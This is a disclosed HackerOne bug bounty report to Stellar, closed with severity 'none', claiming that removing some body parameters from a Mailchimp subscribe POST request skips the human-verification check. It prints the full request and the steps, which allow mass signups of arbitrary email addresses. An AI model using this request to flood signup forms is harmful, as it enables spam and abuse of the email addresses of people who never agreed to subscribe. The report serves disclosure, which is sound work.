# Bypassing Verify Humans Page

## Report Details
- **Report ID**: 242874
- **URL**: https://hackerone.com/reports/242874
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-06-24T11:54:04.384Z
- **Disclosed**: 2020-02-23T16:22:57.512Z

## Reporter
- **Username**: suvrat7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stellar

## Vulnerability Information
Hi Team,
I was able to bypass verify Human dialog Box , while subscribing .
Vulnerable request:
====================
```
POST /subscribe/post HTTP/1.1
Host: stellar.us9.list-manage.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 264
Referer: https://stellar.us9.list-manage.com/subscribe/post?u=c001d97369b7a10d224c23867&id=563f658d41&SIGNUP=community
Cookie: _AVESTA_ENVIRONMENT=prod; PHPSESSID=5kid70ckbbvfpshmvoc6m7vqr1
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

u=c001d97369b7a10d224c23867&id=563f658d41&b_name=&b_email=&b_comment=&MERGE0=codelover16%40gmail.com&MERGE1=su&MERGE2=ascas&group%5B17489%5D%5B1%5D=1&submit=Subscribe+to+list&ht=8cad8bee67974ea68255fd9b15685974905f31d8%3AMTQ5ODMwMTUyNS43ODA4&mc_signupsource=hosted
```
Steps to reproduce:
====================
1. Delete Body param
```
&MERGE1=su&MERGE2=ascas&group%5B17489%5D%5B1%5D=1&submit=Subscribe+to+list&ht=8cad8bee67974ea68255fd9b15685974905f31d8%3AMTQ5ODMwMTUyNS43ODA4&mc_signupsource=hosted
```
2 . And you will be able to bypass human authentication

Impact
====================
1. This request can be brute forced , which can result to Bringing down and Spamming the Email server.
2. I was able to verify multiple accounts by changing **MERGE0** with different email addresses using same **u=** and **id=** param.

Thanks,
Suvrat(codelover16)


## Attachments
No attachments
